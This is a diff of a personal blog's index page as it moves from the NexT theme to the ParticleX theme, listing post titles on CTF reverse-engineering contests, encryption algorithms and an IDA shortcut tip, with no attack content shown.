-                <time title="修改时间：2024-11-14 23:41:18" itemprop="dateModified" datetime="2024-11-14T23:41:18+08:00">2024-11-14</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="NSSCTF题目"><a href="#NSSCTF题目" class="headerlink" title="NSSCTF题目"></a>NSSCTF题目</h1>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/11/07/reverse%E9%A2%98%E7%9B%AE/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/26/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="songhahaha">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="songhahaha的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/26/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">题目复现和一些加密算法</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2024-10-26 22:29:56 / 修改时间：23:07:01" itemprop="dateCreated datePublished" datetime="2024-10-26T22:29:56+08:00">2024-10-26</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="2024螺丝新生赛"><a href="#2024螺丝新生赛" class="headerlink" title="2024螺丝新生赛"></a>2024螺丝新生赛</h2>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/26/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
         
-      
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2024/10/22/%E7%AC%AC%E4%B8%80%E6%AC%A124.10.25/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="songhahaha">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="songhahaha的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2024/10/22/%E7%AC%AC%E4%B8%80%E6%AC%A124.10.25/" class="post-title-link" itemprop="url">一些Reverse新生赛题目</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2024-10-22 22:55:26" itemprop="dateCreated datePublished" datetime="2024-10-22T22:55:26+08:00">2024-10-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-10-25 19:41:32" itemprop="dateModified" datetime="2024-10-25T19:41:32+08:00">2024-10-25</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0xgame题目"><a href="#0xgame题目" class="headerlink" title="0xgame题目"></a>0xgame题目</h2>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2024/10/22/%E7%AC%AC%E4%B8%80%E6%AC%A124.10.25/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
-  
-
-
-
-          </div>
-          
-
-<script>
-  window.addEventListener('tabs:register', () => {
-    let { activeClass } = CONFIG.comments;
-    if (CONFIG.comments.storage) {
-      activeClass = localStorage.getItem('comments_active') || activeClass;
-    }
-    if (activeClass) {
-      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
-      if (activeTab) {
-        activeTab.click();
-      }
-    }
-  });
-  if (CONFIG.comments.storage) {
-    window.addEventListener('tabs:click', event => {
-      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
-      let commentClass = event.target.classList[1];
-      localStorage.setItem('comments_active', commentClass);
-    });
-  }
-</script>
-
-        </div>
-          
-  
-  <div class="toggle sidebar-toggle">
-    <span class="toggle-line toggle-line-first"></span>
-    <span class="toggle-line toggle-line-middle"></span>
-    <span class="toggle-line toggle-line-last"></span>
-  </div>
-
-  <aside class="sidebar">
-    <div class="sidebar-inner">
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc">
-          文章目录
-        </li>
-        <li class="sidebar-nav-overview">
-          站点概览
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">songhahaha</p>
-  <div class="site-description" itemprop="description"></div>
+    <a href="/2024/12/16/2024HECTF/" class="go-post">阅读全文</a>
 </div>
-<div class="site-state-wrap motion-element">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-          <a href="/archives/">
+
+<div class="post">
+    <a href="/2024/11/07/IDA%E4%BD%BF%E7%94%A8/">
+        <h2 class="post-title">IDA快捷键</h2>
+    </a>
+    <div class="category-and-date">
         
-          <span class="site-state-item-count">5</span>
-          <span class="site-state-item-name">日志</span>
-        </a>
-      </div>
-  </nav>
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/11/7
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <p>shift+E可以提取数组数据</p>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/11/07/IDA%E4%BD%BF%E7%94%A8/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/10/26/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+        <h2 class="post-title">题目复现和一些加密算法</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/10/26
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="2024螺丝新生赛"><a href="#2024螺丝新生赛" class="headerlink" title="2024螺丝新生赛"></a>2024螺丝新生赛</h2>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/10/26/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2024/10/22/%E7%AC%AC%E4%B8%80%E6%AC%A124.10.25/">
+        <h2 class="post-title">一些Reverse新生赛题目</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/10/22
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h2 id="0xgame题目"><a href="#0xgame题目" class="headerlink" title="0xgame题目"></a>0xgame题目</h2>
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        
+        
+    </div>
+    <a href="/2024/10/22/%E7%AC%AC%E4%B8%80%E6%AC%A124.10.25/" class="go-post">阅读全文</a>
 </div>
 
 
-
-      </div>
+        <div class="page-current">
+    
+    <span class="current">1</span>
+    
+    
+    
+    
+</div>
 
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
+    
+    <div id="home-card">
+        <div id="card-style">
+    <div id="card-div">
+        <div class="avatar">
+            <img src="/images/avatar.jpg" alt="avatar" />
+        </div>
+        <div class="name">songhahaha</div>
+        <div class="description">
+            <p>Description<br>…</p>
 
-
-      </div>
-    </main>
-
-    <footer class="footer">
-      <div class="footer-inner">
+        </div>
         
-
         
-
-<div class="copyright">
-  
-  &copy; 
-  <span itemprop="copyrightYear">2024</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">songhahaha</span>
+        <div class="friend-links">
+            
+            <div class="friend-link">
+                <a target="_blank" rel="noopener" href="https://argvchs.github.io">Argvchs</a>
+            </div>
+            
+        </div>
+        
+    </div>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
-  </div>
 
+    </div>
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2024 songhahaha的个人博客
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;songhahaha
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
         
+    </div>
+</footer>
 
-
-
-
-
-
-
-
-      </div>
-    </footer>
-  </div>
-
-  
-  <script src="/lib/anime.min.js"></script>
-  <script src="/lib/velocity/velocity.min.js"></script>
-  <script src="/lib/velocity/velocity.ui.min.js"></script>
-
-<script src="/js/utils.js"></script>
-
-<script src="/js/motion.js"></script>
-
-
-<script src="/js/schemes/pisces.js"></script>
-
-
-<script src="/js/next-boot.js"></script>
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
 </body>
 </html>
